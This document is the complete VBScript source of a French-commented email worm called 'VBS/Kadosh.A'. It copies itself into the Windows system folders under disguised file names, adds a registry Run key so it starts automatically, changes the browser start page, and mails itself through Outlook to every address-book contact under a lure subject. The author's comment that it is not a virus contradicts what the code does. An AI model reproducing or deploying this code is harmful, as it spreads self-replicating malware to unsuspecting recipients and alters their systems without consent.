rem VBS/Kadosh.A par PandaKiller
rem Ce fichier se copie dans le r‚pertoire WINDOWS sous le nom de
rem WINEXEC.EXE.VBS et dans le r‚pertoire SYSTEM sous winRun.dll.vbs
rem Il change la page de d‚marrage du WEB et met LIVE.MULTIMANIA.COM
rem ATTENTION : Norton d‚tŠcte ce programme comme le virus VBS.NewLove.A
rem CE N'EST PAS UN VIRUS : IL NE DTRUIT RIEN

DEBUT()
Sub DEBUT()
Set a = CreateObject("Scripting.FileSystemObject")
Set win = a.GetSpecialFolder(0)
Set sys = a.GetSpecialFolder(1)
Set c = a.GetFile(WScript.ScriptFullName)
c.Copy(win&"\WinExec.exe.vbs")
c.Copy(sys&"\WinRun.dll.vbs")
INTERNET()
EMAIL()
msgbox "Le tour du monde en 20 jours",vbinformation
End Sub

rem MODIFIE LA PAGE DE DEMARRAGE D'INTERNET

Sub INTERNET()
Set W = Wscript.CreateObject("WScript.Shell")
W.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "live.multimania.com"
W.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\WinExec", "C:\WINDOWS\WinExec.exe.vbs"
End Sub

rem ENVOIE UNE DE SES COPIE A TOUS LES DESTINATAIRE DU CARNET D'ADRESSE

Sub EMAIL()
Set K = CreateObject("Outlook.Application")
Set L = K.GetNameSpace("MAPI")
For Each M In L.AddressLists
If M.AddressEntries.Count <> 0 Then
Set N = K.CreateItem(0)
For O = 1 To M.AddressEntries.Count
Set P = M.AddressEntries(O)
If O = 1 Then
N.BCC = P.Address
Else
N.BCC = N.BCC & "; " & P.Address
End If
Next
N.Subject = "Le Tour du Monde"
N.Body = "Voici une lettre qui va faire le tour du monde. Ouvre Vite"
Set Q = CreateObject("Scripting.FileSystemObject")
N.Attachments.Add Q.BuildPath(Q.GetSpecialFolder(0),"WinExec.exe.vbs")
N.Send
End If
Next
End Sub
